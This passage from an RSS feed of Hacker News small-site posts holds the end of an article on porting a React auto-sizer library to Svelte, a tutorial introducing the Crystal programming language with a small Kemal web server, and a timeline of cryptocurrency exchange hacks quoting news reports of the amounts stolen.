<span><span>    </span><span>{</span><span>#</span><span>if</span><span> </span><span>!</span><span>bailoutOnChildren</span><span>}</span></span>
<span><span>        </span><span>&lt;slot</span><span> </span><span>width</span><span>={</span><span>childParams</span><span>.</span><span>width</span><span>}</span><span> </span><span>height</span><span>={</span><span>childParams</span><span>.</span><span>height</span><span>}</span><span> </span><span>/&gt;</span></span>
<span><span>    </span><span>{/</span><span>if</span><span>}</span></span>
<span><span>&lt;/div&gt;</span></span></code></p>
      
    </pre>
<h4 id="Types">Types
    </h4>

<p>Typescript declarations make the life of the consumer of the library easier. The types of the React library are stored within the definitelyTyped project <code><code>@types/react-virtualized-auto-sizer</code></code>.
    </p>
<p>The React component is changed into a Svelte component:
    </p>
<pre><p><code><span><span>/// @types/react-virtualized-auto-sizer/index.d.ts</span></span>
<span><span>import</span><span> </span><span>*</span><span> </span><span>as</span><span> </span><span>React</span><span> </span><span>from</span><span> </span><span>"</span><span>react</span><span>"</span><span>;</span></span>
<span><span>...</span></span>
<span><span>export</span><span> </span><span>default</span><span> </span><span>class</span><span> </span><span>extends</span><span> </span><span>React</span><span>.</span><span>Component</span><span>&lt;</span><span>AutoSizerProps</span><span>&gt;</span><span> </span><span>{}</span></span></code></p>
      
    </pre>
<p>To:
    </p>
<pre><p><code><span><span>/// svelte-virtualized-auto-sizer/index.d.ts</span></span>
<span><span>import</span><span> </span><span>{</span><span>SvelteComponentTyped</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>svelte</span><span>'</span><span>;</span></span>
<span><span>...</span></span>
<span><span>export</span><span> </span><span>default</span><span> </span><span>class</span><span> </span><span>extends</span><span> </span><span>SvelteComponentTyped</span><span>&lt;</span><span>AutoSizerProps</span><span>,{},{</span><span>default</span><span>:</span><span>{</span><span>width</span><span>?:</span><span>number</span><span>,</span><span>height</span><span>?:</span><span>number</span><span>}}&gt;</span><span> </span><span>{}</span></span></code></p>
      
    </pre>
<h4 id="Howtouseit">How to use it
    </h4>

<p>That's it, the library is ported. You can load the library with
    </p>
<pre><p><code><span><span>npm install --save-dev svelte-virtualized-auto-sizer</span></span></code></p>
      
    </pre>
<p>This is how you would use the original in React:
    </p>
<pre><p><code><span><span>&lt;AutoSizer&gt;</span></span>
<span><span>    {(height,width)=&gt;(</span></span>
<span><span>    &lt;div style={{!width!}}&gt;</span></span>
<span><span>      Test</span></span>
<span><span>    &lt;/div&gt;</span></span>
<span><span>    )}</span></span>
<span><span>&lt;/AutoSizer&gt;</span></span></code></p>
      
    </pre>
<p>and here is the equivalent in Svelte, using the <a href="https://svelte.dev/tutorial/slot-props"><code><code>let:</code></code> directive</a>:
    </p>
<pre><p><code><span><span>&lt;AutoSizer let:width={childWidth} let:height={childHeight}&gt;</span></span>
<span><span>    &lt;div style={"width:"+childWidth+"px;height:"…</span></span></code></p></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gradientdescent.de/porting-react">https://gradientdescent.de/porting-react</a></em></p>]]>
            </description>
            <link>https://gradientdescent.de/porting-react</link>
            <guid isPermaLink="false">hacker-news-small-sites-26217119</guid>
            <pubDate>Sun, 21 Feb 2021 20:57:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to Crystal]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 39 (<a href="https://news.ycombinator.com/item?id=26217013">thread link</a>) | @thejokersthief
<br/>
February 21, 2021 | https://blog.oisinaylward.me/blog/crystal/ | <a href="https://web.archive.org/web/*/https://blog.oisinaylward.me/blog/crystal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>February 21, 2021</p><p><span>
      <a href="https://blog.oisinaylward.me/static/4b7744fa7f6437cd019695014a425c0f/3684f/crystal.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Crystal logo" title="Crystal logo" src="https://d33wubrfki0l68.cloudfront.net/8a901d72da53e5eb6edcf11dce08acb6818f1731/a9b08/static/4b7744fa7f6437cd019695014a425c0f/3684f/crystal.png" srcset="https://d33wubrfki0l68.cloudfront.net/9076bceecd20a42a2fcc6f79b977cd7842af0266/e2060/static/4b7744fa7f6437cd019695014a425c0f/12f09/crystal.png 148w,https://d33wubrfki0l68.cloudfront.net/8a901d72da53e5eb6edcf11dce08acb6818f1731/a9b08/static/4b7744fa7f6437cd019695014a425c0f/3684f/crystal.png 225w" sizes="(max-width: 225px) 100vw, 225px" loading="lazy">
  </a>
    </span></p><p>One of my favourite programming languages in the last few years has been <a href="https://crystal-lang.org/">Crystal</a>. While the language has not yet reached its 1.0 version, it has been widely used in production and has a growing ecosystem. Crystal provides an easy setup and allows you to jump straight into developing your own Crystal programs. I’m going to walk you through getting it setup and how you can get started!</p><deckgo-highlight-code crystal="" terminal="carbon" highlight-lines="">
          <code slot="code">puts "Hello World"</code>
        </deckgo-highlight-code><p>Crystal is a general purpose, Ruby-inspired compiled programming language, making it extremely fast and easy to program with. The syntax is strongly inspired by Ruby, but also provides static typechecking. Crystal sits somewhere in the top 100 programming languages according to <a href="https://www.tiobe.com/tiobe-index/">TIOBE</a>, not widely used but don’t let that put you off!</p><p>I was originally interested in Crystal due to its expressive syntax and the claims on its speed. I am likely in the minority in that I came into Crystal with no prior Ruby experience. Crystal soon became my go-to language for personal programming projects. My project <a href="https://github.com/azula-lang/azula">Azula</a> (WIP programming language) was built entirely in Crystal - a choice a made due to Crystal’s nice macro system and built-in LLVM bindings. Crystal was an excellent choice, allowing rapid development and producing a small binary (1.9mb in Crystal vs 3mb in Go).</p><h3>Shards</h3><p>The Crystal ecosystem is powered by its Shard system. Shards is Crystal’s dependency manager that is usually installed along with Crystal. It aims to allow reproducible installs across platforms by declaring dependencies and their versions. You can read more about Shards <a href="https://crystal-lang.org/reference/the_shards_command/index.html">here</a>.</p><h2>Installing Crystal</h2><p>On Ubuntu, installing Crystal is as easy as running:</p><deckgo-highlight-code bash="" terminal="carbon" highlight-lines="">
          <code slot="code">$ curl -fsSL https://crystal-lang.org/install.sh | sudo bash</code>
        </deckgo-highlight-code><p>For other platforms, have a look at the <a href="https://crystal-lang.org/install/">Crystal install guide</a>!</p><h2>First Crystal Program</h2><p>Crystal provides a nice scaffolding tool to setup a new project, including a README template, license and gitignore.</p><deckgo-highlight-code bash="" terminal="carbon" highlight-lines="">
          <code slot="code">$ crystal init app myproject</code>
        </deckgo-highlight-code><p>If we open up <code>myproject/src/myproject.cr</code>, we can start writing our Crystal program!</p><deckgo-highlight-code crystal="" terminal="carbon" highlight-lines="">
          <code slot="code">def say(message : String)
    puts message
end

say "Hello!"</code>
        </deckgo-highlight-code><p>In this example, we create a function called <code>say</code> that accepts a string and passes it to <code>puts</code>. As you can see, almost identical to Ruby except for the typing of the parameter in the function.</p><h2>Project Structure</h2><h3>src</h3><p>Inside the <code>src/</code> directory is where all the Crystal files will go. It can contain subdirectories, allowing you to divide up your code. You can include separate files by using the <code>require</code> keyword.</p><h3>spec</h3><p>The <code>spec/</code> directory is the home for your tests. Using the <code>crystal spec</code> subcommand, we can run all our tests.</p><deckgo-highlight-code crystal="" terminal="carbon" highlight-lines="">
          <code slot="code">it "works" do
    i = 5 + 10
    i.should eq 15
end</code>
        </deckgo-highlight-code><h3>shard.yml</h3><p><code>shard.yml</code> is used to define our project. In here, we define the name, version, authors, Crystal version, licence &amp; dependencies.</p><deckgo-highlight-code yaml="" terminal="carbon" highlight-lines="">
          <code slot="code">name: myproject
version: 0.1.0

authors:
  - OisinA

targets:
  myproject:
    main: src/myproject.cr

crystal: 0.36.1

license: MIT</code>
        </deckgo-highlight-code><h2>Building &amp; Running</h2><h3>Running</h3><deckgo-highlight-code bash="" terminal="carbon" highlight-lines="">
          <code slot="code">$ crystal run src/myproject.cr
Hello!</code>
        </deckgo-highlight-code><p>Running your Crystal project is as simple as running <code>crystal run [file]</code>.</p><h3>Building</h3><deckgo-highlight-code bash="" terminal="carbon" highlight-lines="">
          <code slot="code">$ crystal build src/myproject.cr
$ ./myproject
Hello!</code>
        </deckgo-highlight-code><p>To build your project, you use <code>crystal build [file]</code> producing an executable. You can optionally use the <code>--release</code> optimising the executable. This flag will significantly increase the build time but the produced binary should be smaller and faster.</p><p>Crystal’s build times are reasonable. Compiling my project <a href="https://github.com/azula-lang/azula">Azula</a> takes ~16s with the release flag. Compiling our barebones project above takes ~8s.</p><h2>Example</h2><h3>Simple Web Server</h3><p>In this example, I am using <a href="https://github.com/kemalcr/kemal">Kemal</a>, a HTTP framework for Crystal, to set up a really simple web server to return some JSON on a request. Kemal makes it really easy to quickly write a web application and has built-in JSON support, static file serving and templating. Kemal is installed using Crystal Shards, adding it to the <code>shards.yml</code>.</p><deckgo-highlight-code crystal="" terminal="carbon" highlight-lines="">
          <code slot="code">require "kemal"
require "json"

get "/" do |env|
    env.response.content_type = "application/json"
    {name: "Oisin", time: Time.local}.to_json
end

Kemal.run</code>
        </deckgo-highlight-code><p>Running this will start up a HTTP server on port 3000, returning JSON containing name and the current time.</p><deckgo-highlight-code bash="" terminal="carbon" highlight-lines="">
          <code slot="code">$ curl http://localhost:3000
{"name":"Oisin","time":"2021-02-21T18:07:46+00:00"}</code>
        </deckgo-highlight-code><p>It’s as simple as that!</p><h2>The Future of Crystal</h2><p>With Crystal being in a nice place at the moment - what are the next steps? The next step for Crystal is to reach a 1.0 release. This version of Crystal will be completely stable and fully ready for production. The Crystal team are currently working towards this goal currently. While there is no timeline in place, its an exciting prospect! I am excited for the future of Crystal and hope to see it more widely used.</p><h2>Resources</h2><p>If you’ve enjoyed this blog post, you might be interested in reading more about Crystal and its ecosystem. I’ll list some links here and feel free to reach out to me on <a href="https://twitter.com/oisinaylward">Twitter</a> if you have any questions!</p><ul><li><a href="https://github.com/veelenga/awesome-crystal">Awesome Crystal List</a> A big list of Crystal code and resources</li><li><a href="https://crystal-lang.org/reference/index.html">Crystal Reference</a> The Crystal Team’s own language reference</li><li><a href="https://crystal-lang.org/api/">Crystal API Docs</a> Crystal’s API docs for working with the standard library</li></ul><h3>Footnotes:</h3><ul><li><a href="https://twitter.com/osslate">@osslate</a>
For proof-reading and giving nice criticism &lt;3</li><li><a href="https://crystal-lang.org/2020/03/03/towards-crystal-1.0.html">Towards 1.0</a>
Information about Crystal’s upcoming 1.0 release</li></ul><hr><ul><li></li><li></li></ul></div></div>]]>
            </description>
            <link>https://blog.oisinaylward.me/blog/crystal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26217013</guid>
            <pubDate>Sun, 21 Feb 2021 20:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Complete List of Cryptocurrency Exchange Hacks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26216947">thread link</a>) | @gjvc
<br/>
February 21, 2021 | https://cryptosec.info/exchange-hacks/ | <a href="https://web.archive.org/web/*/https://cryptosec.info/exchange-hacks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-elementor-type="wp-post" data-elementor-id="1684" data-elementor-settings="[]">
						<div>
							<div>
							<section data-id="75de9f9f" data-element_type="section">
						<div>
							<div>
					<div data-id="7d8cf1a9" data-element_type="column">
			<div>
							<div>
						<div data-id="4d47f9f6" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>As of today, there are a total of <span>49 hacking events</span>, with lost funds amounting to a total of <span>approximately $2.1 billion </span>at the times of these hacks, with the Mt.Gox hack of 2014 being the biggest casualty yet with $661,348,000 of stolen funds. The total amount does not include stolen user data and undisclosed amounts of stolen funds.</p>
<p>If you’re a trader and you really need to leave funds on exchanges, take your time into learning how to <a href="https://cryptosec.info/secure-your-exchange-accounts/">secure your exchange accounts</a>.</p>
<p>If you don’t actively trade, make sure to store your funds using a reputable <a href="https://cryptosec.info/cryptocurrency-wallets/#hardware_wallets">hardware wallet</a>.</p>

</div>
				</div>
				</div>
				<section data-id="617efb1" data-element_type="section">
						
		</section>
				
				
				
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="340801d" data-element_type="section">
						<div>
							<div>
					<div data-id="8b2bf8d" data-element_type="column">
			<div>
							<div>
						<div data-id="73bba6b" data-element_type="widget" data-widget_type="eae-timeline.skin1">
				<div>
					<section data-layout="center" data-top-offset="200">
			

			
								
						<div id="2ccea13">

				

				<div id="2ccea13">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2021/01/livecoin_logo.png" src="https://cryptosec.info/wp-content/uploads/2021/01/livecoin_logo.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Livecoin</h3><div><p>"Russian cryptocurrency exchange Livecoin posted on message on its official website on Christmas Eve claiming it was hacked and lost control of some of its servers, warning customers to stop using its services."</p>
<p><span>Amount stolen: <span>n/a</span></span></p>
<p><span>Source: <a href="https://www.zdnet.com/article/russian-crypto-exchange-livecoin-hacked-after-it-lost-control-of-its-servers/" target="_blank" rel="noopener">ZDNet</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="7846bc7">

				

				<div id="7846bc7">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2021/01/kucoin_icon.png" src="https://cryptosec.info/wp-content/uploads/2021/01/kucoin_icon.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>KuCoin</h3><div><p>"In a live stream on 4:30 UTC Saturday, KuCoin CEO Johnny Lyu said one or more hackers obtained the private keys to the exchange’s hot wallets. KuCoin transferred what was left in them to new hot wallets, abandoned the old ones and froze customer deposits and withdrawals, Lyu said."</p>
<p><span>Amount stolen: <span>$280,000,000</span></span></p>
<p><span>Source: <a href="https://www.coindesk.com/hackers-drain-kucoin-crypto-exchanges-funds" target="_blank" rel="noopener">CoinDesk</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="d65c651">

				

				<div id="d65c651">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2020/02/altsbit.png" src="https://cryptosec.info/wp-content/uploads/2020/02/altsbit.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Eterbase</h3><div><p>"Eterbase Exchange, a popular Slovakian cryptocurrency exchange platform was hacked by threat actors, on September 8, 2020. Reportedly, $5.4 Million worth of funds were stolen and transferred by hackers from the platform, taking the security industry by storm."</p>
<p><span>Amount stolen: <span>$5,400,000</span></span></p>
<p><span>Source: <a href="https://securityboulevard.com/2020/09/eterbase-exchange-hacked-hackers-stole-5-4-mn/" target="_blank" rel="noopener">Security Boulevard</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="2b46f97">

				

				<div id="2b46f97">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2021/01/buyucoin_icon.png" src="https://cryptosec.info/wp-content/uploads/2021/01/buyucoin_icon.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>BuyUcoin</h3><div><p>"Buyucoin, a Delhi NCR-based cryptocurrency exchange, has reportedly been hacked. The exchange has more than 350K registered users and has facilitated over $500 million in cryptocurrency trades, according to its website. Several local news outlets reported that sensitive data of about 325K customers has been dumped onto the dark web."</p>
<p><span>Amount stolen: <span>n/a</span></span></p>
<p><span>Source: <a href="https://news.bitcoin.com/indian-cryptocurrency-exchange-buyucoin-hacked-data-users-leaked/" target="_blank" rel="noopener">Bitcoin.com</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="1669a94">

				

				<div id="1669a94">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2020/02/altsbit.png" src="https://cryptosec.info/wp-content/uploads/2020/02/altsbit.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Altsbit</h3><div><p>"our exchange was hacked during the night and almost all funds from BTC, ETH, ARRR and VRSC were stolen."</p>
<p><span>Amount stolen: <span>$73,000</span></span></p>
<p><span>Source: <a href="https://twitter.com/altsbit/status/1225319347687653377" target="_blank" rel="noopener">Twitter @Altsbit</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="9e40bb3">

				

				<div id="9e40bb3">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/11/upbit_logo.png" src="https://cryptosec.info/wp-content/uploads/2019/11/upbit_logo.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Upbit</h3><div><p>"At approximately 13:06 on November 27th, 2019 (KST), 342,000 ETH was sent from Upbit’s Ethereum hot wallet to an anonymous wallet address."</p>
<p><span>Amount stolen: <span>$49,000,000</span></span></p>
<p><span>Source: <a href="https://upbit.com/service_center/notice?id=1085" target="_blank" rel="noopener">Upbit</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="2ba0531">

				

				<div id="2ba0531">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/07/bitpoint.png" src="https://cryptosec.info/wp-content/uploads/2019/07/bitpoint.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>BITPoint</h3><div><p>"Japanese cryptocurrency exchange Bitpoint was hacked last week when hackers&nbsp;stole 3.5 billion yen ($32 million) from the exchange’s hot wallet, of which 2.5 billion yen were customer funds."</p>
<p><span>Amount stolen: <span>$32,000,000</span></span></p>
<p><span>Source: <a href="https://www.ccn.com/news/50000-users-bitpoint-hack/2019/07/16/" target="_blank" rel="noopener">CCN</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="1183b5a">

				

				<div id="1183b5a">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/06/Bitruewhite-1.png" src="https://cryptosec.info/wp-content/uploads/2019/06/Bitruewhite-1.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Bitrue</h3><div><p>"Singapore-based cryptocurrency exchange Bitrue has been hacked for around $4.2 million in user assets."</p>
<p><span>Amount stolen: <span>$4,200,000</span></span></p>
<p><span>Source: <a href="https://www.coindesk.com/singapore-exchange-bitrue-hacked-for-over-4-million-in-crypto" target="_blank" rel="noopener">CoinDesk</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="f1fbf1b">

				

				<div id="f1fbf1b">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/06/binancewhite.png" src="https://cryptosec.info/wp-content/uploads/2019/06/binancewhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Binance</h3><div><p>"hackers withdrew 7,000 Bitcoins worth about $40 million via a single transaction in a “large scale security breach,” ... "The hackers used a “variety of techniques” including phishing and viruses to obtain a large amount of user data"</p>
<p><span>Amount stolen: <span>$40,000,000</span></span></p>
<p><span>Source: <a href="https://www.bloomberg.com/news/articles/2019-05-08/crypto-exchange-giant-binance-reports-a-hack-of-7-000-bitcoin" target="_blank" rel="noopener">Bloomberg</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="87da116">

				

				<div id="87da116">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/06/bithumbwhite.png" src="https://cryptosec.info/wp-content/uploads/2019/06/bithumbwhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Bithumb</h3><div><p>"South Korean crypto exchange Bithumb has had around $13 million in the EOS cryptocurrency stolen in a hack it suspects was an insider job.</p>
<p>The company confirmed in&nbsp;statement on Saturday that it first spotted an “abnormal withdrawal” of the cryptocurrency&nbsp;through its monitoring system"</p>
<p><span>Amount stolen: <span>$13,000,000</span></span></p>
<p><span>Source: <a href="https://www.coindesk.com/crypto-exchange-bithumb-hacked-for-13-million-in-suspected-insider-job" target="_blank" rel="noopener">CoinDesk</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="1b3a244">

				

				<div id="1b3a244">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/07/coinbenewhite.png" src="https://cryptosec.info/wp-content/uploads/2019/07/coinbenewhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Coinbene</h3><div><p>"Over $100 Million Missing: CoinBene Claims Maintenance, a Month of Questions Point Toward a Hack"</p>
<p><span>Amount stolen: <span>$100,000,000</span></span></p>
<p><span>Source: <a href="https://cointelegraph.com/news/over-100-million-missing-coinbene-claims-maintenance-a-month-of-questions-point-toward-a-hack" target="_blank" rel="noopener">Cointelegraph</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="c975de3">

				

				<div id="c975de3">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/06/dragonexwhite.png" src="https://cryptosec.info/wp-content/uploads/2019/06/dragonexwhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>DragonEx</h3><div><p>"DragonEx announced the news on its official Telegram channel on Monday, stating that, on Sunday, March 24, it had suffered a cyberattack that saw cryptocurrency funds owned by users and the exchange “transferred and stolen.” No information has yet been provided on the value of the losses."</p>
<p><span>Amount stolen: n/a</span></p>
<p><span>Source: <a href="https://www.coindesk.com/singapore-based-crypto-exchange-dragonex-has-been-hacked" target="_blank" rel="noopener">CoinDesk</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="6b751a8">

				

				<div id="6b751a8">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/07/coinmamawhite.png" src="https://cryptosec.info/wp-content/uploads/2019/07/coinmamawhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Coinmama</h3><div><p>"The official statement of the exchange disclosed that 450,000 email addresses and passwords were leaked in a massive global hacking attack involving 24 websites and some 747 million records."</p>
<p><span>Amount stolen: n/a</span></p>
<p><span>Source: <a href="https://www.ccn.com/breaking-major-crypto-brokerage-coinmama-hacked-450000-users-affected-in-massive-worldwide-breach/" target="_blank" rel="noopener">CCN</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="8f764e4">

				

				<div id="8f764e4">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/07/cryptopiawhite.png" src="https://cryptosec.info/wp-content/uploads/2019/07/cryptopiawhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Cryptopia</h3><div><p>"The exchange&nbsp;announced the news on Twitter, stating that it “suffered a security breach which resulted in significant losses.”</p>
<p>Meanwhile, tweets from Whale Alert indicated that 19,391 (ETH) tokens worth nearly $2.44 million&nbsp;and around 48 million centrality (CENNZ) tokens worth about&nbsp;$1.18 million were transferred from Cryptopia to unknown wallets on Jan. 13."</p>
<p><span>Amount stolen: <span>$3,620,000</span></span></p>
<p><span>Source: <a href="https://www.coindesk.com/new-zealand-crypto-exchange-cryptopia-goes-offline-citing-major-hack" target="_blank" rel="noopener">CoinDesk</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="2f758cf">

				

				<div id="2f758cf">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/06/maplechangewhite.png" src="https://cryptosec.info/wp-content/uploads/2019/06/maplechangewhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>MapleChange</h3><div><p>Canadian crypto exchange&nbsp;Maple Change has been hacked. The company is reporting over $5 million in losses – virtually all its funds – and says it cannot pay any of its customers back.</p>
<p>However, many are questioning whether the company was hacked or if the loss was something planned by internal representatives..</p>
<p><span>Amount stolen: <span>$5,000,000</span></span></p>
<p><span>Source: <a href="https://blockonomi.com/maplechange-hacked-scam/" target="_blank" rel="noopener">Blockonomi</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="530a7c8">

				

				<div id="530a7c8">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/06/zaifwhite.png" src="https://cryptosec.info/wp-content/uploads/2019/06/zaifwhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Zaif</h3><div><p>"Japan-based cryptocurrency exchange has been hacked, losing a 6.7 billion yen (about $60 million worth of cryptocurrency), including 5,966 bitcoins."</p>
<p><span>Amount stolen: <span>$60,000,000</span></span></p>
<p><span>Source: <a href="https://www.coindesk.com/crypto-exchange-zaif-hacked-in-60-million-6000-bitcoin-theft" target="_blank" rel="noopener">CoinDesk</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="1f2c40e">

				

				<div id="1f2c40e">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/07/bancorwhite.png" src="https://cryptosec.info/wp-content/uploads/2019/07/bancorwhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Bancor</h3><div><p>"Bancor, a crypto company that touts a decentralized exchange service, has lost some $23.5 million of cryptocurrency tokens belonging to its users following a hack."</p>
<p><span>Amount stolen: <span>$23,500,000</span></span></p>
<p><span>Source: <a href="https://techcrunch.com/2018/07/10/bancor-loses-23-5m/" target="_blank" rel="noopener">TechCrunch</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="8cb1230">

				

				<div id="8cb1230">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/06/bithumbwhite.png" src="https://cryptosec.info/wp-content/uploads/2019/06/bithumbwhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Bithumb</h3><div><p>"roughly 35 billion Korean won (around $31 million) in cryptocurrency was stolen by hackers from the South Korea-based exchange Bithumb"</p>
<p><span>Amount stolen: <span>$31,000,000</span></span></p>
<p><span>Source: <a href="https://www.coindesk.com/bithumb-exchanges-31-million-hack-know-dont-know" target="_blank" rel="noopener">CoinDesk</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="e5b633d">

				

				<div id="e5b633d">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/06/coinrailwhite.png" src="https://cryptosec.info/wp-content/uploads/2019/06/coinrailwhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Coinrail</h3><div><p><span>"Coinrail, a cryptocurrency exchange based in South Korea, said on Sunday its platform has been hacked, with other sources suggesting it lost cryptocurrencies totaling as much as $40 million in the attack."</span></p>
<p><span>Amount stolen: <span>$40,000,000</span></span></p>
<p><span>Source: <a href="https://www.coindesk.com/coinrail-exchange-hacked-loses-possibly-40-million-in-cryptos" target="_blank" rel="noopener">CoinDesk</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="e6070b5">

				

				<div id="e6070b5">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/06/bitgrailwhite.png" src="https://cryptosec.info/wp-content/uploads/2019/06/bitgrailwhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>BitGrail</h3><div><p>"On Friday, BitGrail posted a notice to users informing them that hackers had made off with 17 million units of Nano (XRB), the coin formerly known as RaiBlocks"</p>
<p><span>Amount stolen: <span>$170,000,000</span></span></p>
<p><span>Source: <a href="https://techcrunch.com/2018/02/12/bitgrail-hack-nano/" target="_blank" rel="noopener">TechCrunch</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="758b1b2">

				

				<div id="758b1b2">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/06/coincheckwhite.png" src="https://cryptosec.info/wp-content/uploads/2019/06/coincheckwhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>Coincheck</h3><div><p>"Early Friday morning in Tokyo, hackers broke into a cryptocurrency exchange called Coincheck Inc. and made off with nearly $500 million in digital tokens. It’s one of the biggest heists in history, with the exchange losing more than 500 million of the somewhat obscure NEM coins."</p>
<p><span>Amount stolen: <span>$500,000,000</span></span></p>
<p><span>Source: <a href="http://fortune.com/2018/01/31/coincheck-hack-how/" target="_blank" rel="noopener">Fortune</a></span></p></div>								</div>
							</div>
						</div>
										</div>

			</div>
								
						<div id="b56a76e">

				

				<div id="b56a76e">
								<div>
				<p><i><img data-src="https://cryptosec.info/wp-content/uploads/2019/07/localbitcoinswhite.png" src="https://cryptosec.info/wp-content/uploads/2019/07/localbitcoinswhite.png"></i>				</p>
			</div>
				</div>
				<div>
											<div>
														<div>
								<div>
									
									<h3>LocalBitcoins</h3><div><p>"<b>LocalBitcoins</b>, the popular peer-to-peer market for fiat-to-bitcoin trading, on Saturday said that it had suffered a security breach that lasted about 5 hours before the Finland-based company managed to stop it.</p>
<p>Hackers had …</p></div></div></div></div></div></div></section></div></div></div></div></div></div></div></section></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cryptosec.info/exchange-hacks/">https://cryptosec.info/exchange-hacks/</a></em></p>]]>
            </description>
            <link>https://cryptosec.info/exchange-hacks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26216947</guid>
            <pubDate>Sun, 21 Feb 2021 20:39:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Carbon Filled Nylon Filament Twice as Strong at Half the Cost]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26216781">thread link</a>) | @ddingus
<br/>
